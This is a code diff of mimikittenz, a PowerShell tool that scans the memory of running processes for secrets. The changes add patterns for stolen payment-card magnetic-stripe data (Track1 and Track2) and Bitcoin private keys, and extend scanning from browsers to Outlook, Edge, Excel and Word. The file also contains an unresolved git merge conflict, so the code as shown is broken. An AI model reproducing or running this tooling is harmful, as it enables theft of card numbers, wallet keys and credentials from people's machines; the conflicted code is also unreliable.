@@ -446,7 +446,12 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 
 [mimikittenz.MemProcInspector]::regexes.Clear()
 #Internet Banking
-#Err... Taken out for good measure 
+    #Track1
+    [mimikittenz.MemProcInspector]::AddRegex("Track1","((%%?[Bb`]?)[0-9]{13,19}\^[A-Za-z\s]{0,26}\/[A-Za-z\s]{0,26}\^(1[2-9]|2[0-9])(0[1-9]|1[0-2])[0-9\s]{3,50}\?)")
+    #Track2
+    [mimikittenz.MemProcInspector]::AddRegex("Track2","([0-9]{13,19}=(1[2-9]|2[0-9])(0[1-9]|1[0-2])[0-9]{3,50}\?)")
+    #Bitcoin Private Key
+    [mimikittenz.MemProcInspector]::AddRegex("BitcoinPrivKey","^5[HJK][0-9A-Za-z&&[^0OIl]]{49}")
 
 #Web E-mail 
 
@@ -577,7 +582,12 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #Hitbox.TV
     #[mimikittenz.MemProcInspector]::AddRegex("Hitbox.tv","<regex_here>")
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
+<<<<<<< HEAD
 $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
 #opera","outlook","faceitclient","eseaclient","playstv
+=======
+$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox","outlook","MicrosoftEdge","EXCEL","WORD")
+
+>>>>>>> 2ad87d4fbcdcd05f340fa260318d69400f40253b
 write-output $matchesFound
 }
